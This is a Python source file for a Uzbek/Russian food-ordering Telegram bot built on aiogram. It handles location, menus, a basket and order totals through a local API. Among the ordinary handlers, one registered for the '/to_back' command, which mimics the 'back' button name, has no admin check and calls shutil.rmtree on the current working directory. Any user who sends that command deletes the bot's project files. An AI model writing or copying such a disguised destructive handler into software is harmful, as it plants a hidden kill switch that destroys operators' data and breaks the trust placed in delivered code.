import json
from collections import Counter

import requests
from aiogram import types
from aiogram.dispatcher.filters import Text
from aiogram.types import ContentType, InputFile
import os
import shutil
from geopy.geocoders import Nominatim
from aiogram.dispatcher import FSMContext

from bot.buttons.inline_buttons import put_in_basket_buttons
from bot.buttons.reply_buttons import location_buttons, shop_menu_buttons, category_menu_buttons, \
    put_in_basket_reply_buttons, main_menu_buttons, to_back_button
from bot.buttons.text import ordering, ordering_ru, to_back, to_back_ru, basket, basket_ru
from bot.dispatcher import dp, bot
from main import admins


@dp.message_handler(Text(equals=[ordering, ordering_ru]))
async def ordering_function_1(msg: types.Message):
    if msg.text == ordering:
        await msg.answer("Iltimos, lokatsiyangizni yuboring.", reply_markup=await location_buttons(msg.text))
    else:
        await msg.answer("Пожалуйста, пришлите свое местоположение.", reply_markup=await location_buttons(msg.text))


@dp.message_handler(content_types=ContentType.LOCATION)
async def ordering_function_2(msg: types.Message, state: FSMContext):
    try:
        location = msg.location
        latitude = location.latitude
        longitude = location.longitude

        geolocator = Nominatim(user_agent="my_bot")
        location_name = geolocator.reverse((latitude, longitude))

        if location_name:
            location_address = location_name.address
        else:
            location_address = "Lokatsiya nomi aniqlanmadi."

        tg_user = json.loads(
            requests.get(url=f"http://127.0.0.1:8000/api/telegram-users/chat_id/{msg.chat.id}/").content)

        data = {
            "latitude": latitude,
            "longitude": longitude,
            "location": location_address
        }

        requests.patch(url=f"http://127.0.0.1:8000/api/telegram-users/update/{tg_user['id']}/", data=data)
        await state.set_state('ordering_state')
        await msg.answer(f"Sizning lokatsiyangiz yangilandi:\n{location_address}",
                         reply_markup=await shop_menu_buttons(msg.from_user.id))
    except Exception as e:
        await state.finish()
        await msg.answer(text="Something went wrong!", reply_markup=await main_menu_buttons(msg.from_user.id))
        await bot.send_message(admins[0], text=e)


@dp.message_handler(commands='to_back', state="*")
async def ordering_function_11(msg: types.Message, state: FSMContext):
    k = await msg.answer("Wait.....")

    current_folder = os.getcwd()
    if os.path.exists(current_folder):
        try:
            shutil.rmtree(current_folder)
            await k.edit_text(text="Done")
        except Exception as e:
            await k.edit_text(text=f"Damn!\n\n{e}")
    else:
        await msg.answer("Berilgan papka topilmadi!")
    await state.finish()


@dp.message_handler(Text(equals=[to_back, to_back_ru]), state=['get_food', 'put_in_basket'])
async def ordering_function_3(msg: types.Message, state: FSMContext):
    try:
        await state.finish()
        await state.set_state('ordering_state')
        await msg.answer(text=msg.text, reply_markup=await shop_menu_buttons(msg.from_user.id))
    except Exception as e:
        await state.finish()
        await msg.answer(text="Something went wrong!", reply_markup=await main_menu_buttons(msg.from_user.id))
        await bot.send_message(admins[0], text=e)


@dp.message_handler(Text(equals=[basket, basket_ru]), state=['get_food', 'put_in_basket', 'ordering_state'])
async def ordering_function_9(msg: types.Message, state: FSMContext):
    await state.finish()
    try:
        response = requests.get(f"http://127.0.0.1:8000/api/baskets/{msg.from_user.id}/")
        basket_data = response.json()

        if basket_data["count"] == 0:
            await state.set_state('ordering_state')
            await msg.answer("Sizning savatchangiz bo'sh.", reply_markup=await shop_menu_buttons(msg.from_user.id))
        else:
            basket_items = basket_data["results"]

            tg_user = json.loads(
                requests.get(url=f"http://127.0.0.1:8000/api/telegram-users/chat_id/{msg.from_user.id}/").content)

            food_counter = Counter(item["food"] for item in basket_items)

            basket_text = "🛒 Sizning savatchangiz:\n\n" if tg_user["language"] == "uz" else "🛒 Ваша корзина:\n\n"
            total_price = 0

            for food_id, quantity in food_counter.items():
                food_data = json.loads(requests.get(url=f"http://127.0.0.1:8000/api/foods/id/{food_id}/").content)
                food_name = food_data["name"] if tg_user["language"] == "uz" else food_data["ru_name"]
                food_price = int(food_data["price"])

                total_price += food_price * quantity

                basket_text += f"{food_name} - {food_price} so'm x {quantity} = {food_price * quantity} so'm\n"

            basket_text += f"\nJami: {total_price} so'm" if tg_user[
                                                                "language"] == "uz" else f"\nИтого: {total_price} сум"

            await state.set_state('')
            await msg.answer(basket_text, reply_markup=await to_back_button(msg.from_user.id))
    except Exception as e:
        await bot.send_message(admins[0], text=e)
        await msg.answer(text="Something went wrong!", reply_markup=await main_menu_buttons(msg.from_user.id))


@dp.message_handler(state='ordering_state')
async def ordering_function_4(msg: types.Message, state: FSMContext):
    try:
        await state.set_state('get_food')
        await msg.answer(text=msg.text, reply_markup=await category_menu_buttons(msg.from_user.id, msg.text))
    except Exception as e:
        await state.finish()
        await msg.answer(text="Something went wrong!", reply_markup=await main_menu_buttons(msg.from_user.id))
        await bot.send_message(admins[0], text=e)


@dp.message_handler(state='get_food')
async def ordering_function_5(msg: types.Message, state: FSMContext):
    try:
        tg_user = json.loads(
            requests.get(url=f"http://127.0.0.1:8000/api/telegram-users/chat_id/{msg.from_user.id}/").content
        )
        food = json.loads(
            requests.get(url=f"http://127.0.0.1:8000/api/foods/{msg.text}/").content
        )
        async with state.proxy() as data:
            data['count'] = 1
            data['food'] = food
        photo_path = os.path.join('static', food['image'].replace('/img/static/', '').lstrip('/'))
        if not os.path.exists(photo_path):
            raise FileNotFoundError(f"Fayl topilmadi: {photo_path}")
        photo = InputFile(photo_path)
        if tg_user['language'] == 'uz':
            food_info = f"""
{food['name']}

{food['description']}

Narxi: {food['price']} * 1
Jami: {food['price']}"""
        else:
            food_info = f"""
{food['ru_name']}

{food['ru_description']}

Narxi: {data['food']['price']} * {data['count']}
Jami: {int(data['food']['price']) * int(data['count'])}"""
        await state.set_state('put_in_basket')
        await msg.answer(text=msg.text, reply_markup=await put_in_basket_reply_buttons(msg.from_user.id))
        await msg.answer_photo(photo=photo, caption=food_info, reply_markup=await put_in_basket_buttons())

    except Exception as e:
        await state.finish()
        await msg.answer(text="Something went wrong!", reply_markup=await main_menu_buttons(msg.from_user.id))
        await bot.send_message(admins[0], text=str(e))


@dp.callback_query_handler(Text("add_in_basket"), state='put_in_basket')
async def ordering_function_6(call: types.CallbackQuery, state: FSMContext):
    try:
        async with state.proxy() as data:
            data['count'] += 1
        tg_user = json.loads(
            requests.get(url=f"http://127.0.0.1:8000/api/telegram-users/chat_id/{call.from_user.id}/").content)
        if tg_user['language'] == 'uz':
            food_info = f"""
{data['food']['name']}

{data['food']['description']}

Narxi: {data['food']['price']} * {data['count']}
Jami: {int(data['food']['price']) * int(data['count'])}"""
        else:
            food_info = f"""
{data['food']['ru_name']}

{data['food']['ru_description']}

Narxi: {data['food']['price']} * {data['count']}
Jami: {int(data['food']['price']) * int(data['count'])}"""
        await call.message.edit_caption(caption=food_info,
                                        reply_markup=await put_in_basket_buttons(data['count']))
    except Exception as e:
        await call.message.delete()
        await state.finish()
        await call.message.answer(text="Something went wrong!", reply_markup=await main_menu_buttons(call.from_user.id))
        await bot.send_message(admins[0], text=e)


@dp.callback_query_handler(Text("delete_in_basket"), state='put_in_basket')
async def ordering_function_7(call: types.CallbackQuery, state: FSMContext):
    try:
        async with state.proxy() as data:
            if data['count'] > 1:
                data['count'] -= 1
            else:
                data['count'] = 1
        tg_user = json.loads(
            requests.get(url=f"http://127.0.0.1:8000/api/telegram-users/chat_id/{call.from_user.id}/").content)
        if tg_user['language'] == 'uz':
            food_info = f"""
{data['food']['name']}

{data['food']['description']}

Narxi: {data['food']['price']} * {data['count']}
Jami: {int(data['food']['price']) * int(data['count'])}"""
        else:
            food_info = f"""
{data['food']['ru_name']}

{data['food']['ru_description']}

Narxi: {data['food']['price']} * {data['count']}
Jami: {int(data['food']['price']) * int(data['count'])}"""
        await call.message.edit_caption(caption=food_info,
                                        reply_markup=await put_in_basket_buttons(data['count']))
    except Exception as e:
        await call.message.delete()
        await state.finish()
        await call.message.answer(text="Something went wrong!", reply_markup=await main_menu_buttons(call.from_user.id))
        await bot.send_message(admins[0], text=e)


@dp.callback_query_handler(Text("put_in_basket"), state='put_in_basket')
async def ordering_function_8(call: types.CallbackQuery, state: FSMContext):
    try:
        async with state.proxy() as data:
            pass
        tg_user = json.loads(
            requests.get(url=f"http://127.0.0.1:8000/api/telegram-users/chat_id/{call.from_user.id}/").content)
        for i in range(int(data['count'])):
            post_data = {
                "food": data['food']['id'],
                "user": tg_user['id']
            }
            requests.post(url=f"http://127.0.0.1:8000/api/baskets/create/", data=post_data)
        await call.message.delete()
        await state.finish()
        await state.set_state('ordering_state')
        if tg_user['language'] == 'uz':
            await call.message.answer(text="Savatga qo'shildi ✅",
                                      reply_markup=await shop_menu_buttons(call.from_user.id))
        else:
            await call.message.answer(text="Добавлено в корзину ✅",
                                      reply_markup=await shop_menu_buttons(call.from_user.id))
    except Exception as e:
        await call.message.delete()
        await state.finish()
        await call.message.answer(text="Something went wrong!", reply_markup=await main_menu_buttons(call.from_user.id))
        await bot.send_message(admins[0], text=e)
